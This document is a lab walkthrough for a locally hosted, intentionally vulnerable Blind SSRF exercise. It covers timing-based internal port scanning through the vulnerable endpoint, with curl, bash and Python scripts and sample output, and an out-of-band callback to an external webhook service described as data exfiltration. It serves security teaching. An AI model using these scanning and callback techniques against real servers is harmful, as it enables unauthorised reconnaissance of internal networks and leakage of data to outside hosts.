# Blind SSRF Lab - Proof of Concept

## 🎯 Objective
Exploit Blind SSRF vulnerability to discover internal services and exfiltrate data using timing-based detection and out-of-band (OOB) techniques.

---

## 📋 What is Blind SSRF?

**Blind SSRF** occurs when:
- The application makes server-side requests based on user input
- **NO direct response** is returned to the attacker
- You must use **indirect methods** to confirm exploitation

### Detection Methods:
1. **Error-Based** - Timing differences and HTTP errors
2. **Out-of-Band (OOB)** - External callback services (webhooks)

---

## 🚀 Lab Setup

### Start the Lab
```bash
docker compose up -d
```

### Vulnerable Endpoint
- **URL**: `http://localhost:8000/ssrf/blind`
- **Endpoint**: `POST /ssrf/blind/check-availability`
- **Vulnerability**: No response data returned, only success/error status

---

## 🔍 Method 1: Error-Based Port Scanning

### Concept
- **Open ports** → Connection succeeds → Response takes time
- **Closed ports** → Connection refused → Fast response/error

### Discover Internal Services

#### Test Single Port

```bash
# Test port 6379 (Redis - OPEN)
time curl -X POST http://localhost:8000/ssrf/blind/check-availability \
  -H "Content-Type: application/json" \
  -d '{"url":"http://redis:6379"}'

# Test port 9999 (CLOSED)
time curl -X POST http://localhost:8000/ssrf/blind/check-availability \
  -H "Content-Type: application/json" \
  -d '{"url":"http://redis:9999"}'
```

**Indicators:**
- ✅ **Open port**: Slower response (~3-5 seconds), HTTP 200/500
- ❌ **Closed port**: Fast response (~0.5 seconds), HTTP error

---

### Automated Port Scan Script

```bash


TARGET="redis"
ENDPOINT="http://localhost:8000/ssrf/blind/check-availability"

echo "Scanning common ports on $TARGET..."

for PORT in 21 22 23 25 53 80 443 3306 5432 6379 8080 8443 9000; do
    echo -n "Port $PORT: "
    
    START=$(date +%s%N)
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "{\"url\":\"http://$TARGET:$PORT\"}" \
        --max-time 10)
    END=$(date +%s%N)
    
    DURATION=$(( (END - START) / 1000000 ))
    
    if [ $DURATION -gt 2000 ]; then
        echo "OPEN (${DURATION}ms, HTTP $RESPONSE)"
    else
        echo "CLOSED (${DURATION}ms, HTTP $RESPONSE)"
    fi
    
    sleep 0.5
done
```

**Usage:**
```bash
chmod +x blind_port_scan.sh
./blind_port_scan.sh
```

**Expected Output:**
```
Scanning common ports on redis...
Port 21: CLOSED (234ms, HTTP 500)
Port 22: CLOSED (187ms, HTTP 500)
Port 6379: OPEN (3421ms, HTTP 200)
Port 8080: CLOSED (156ms, HTTP 500)
```

---

### Python Port Scanner

```python

import requests
import time

ENDPOINT = "http://localhost:8000/ssrf/blind/check-availability"
TARGET = "redis"
PORTS = [21, 22, 23, 25, 53, 80, 443, 3306, 5432, 6379, 8080, 8443, 9000]

print(f"[*] Scanning {TARGET}...")

for port in PORTS:
    url = f"http://{TARGET}:{port}"
    
    start = time.time()
    try:
        response = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=10
        )
        duration = (time.time() - start) * 1000
        
        if duration > 2000:
            print(f"[+] Port {port}: OPEN ({duration:.0f}ms, HTTP {response.status_code})")
        else:
            print(f"[-] Port {port}: CLOSED ({duration:.0f}ms, HTTP {response.status_code})")
            
    except Exception as e:
        print(f"[!] Port {port}: ERROR - {e}")
    
    time.sleep(0.5)
```

---

## 🌐 Method 2: Out-of-Band (OOB) Data Exfiltration

### Concept
Use external webhook services to receive callbacks and exfiltrate data.

### Setup Webhook

1. **Visit**: https://webhook.site or https://webhook-test.com
2. **Get unique URL**: `https://webhook-test.com/fab01f41d39914d69f25ed35765253df`

---

### Basic OOB Test

```bash

curl -X POST http://localhost:8000/ssrf/blind/check-availability \
  -H "Content-Type: application/json" \
  -d '{"url":"https://webhook-test.com/fab01f41d39914d69f25ed35765253df"}'
```

**Check webhook dashboard** - You should see incoming request!

---
**Lab URL**: http://localhost:8000/ssrf/blind  
**Endpoint**: `POST /ssrf/blind/check-availability`  
**Webhook**: https://webhook-test.com/fab01f41d39914d69f25ed35765253df

⚠️ **Note**: Blind SSRF requires patience and careful observation of timing patterns and external callbacks.
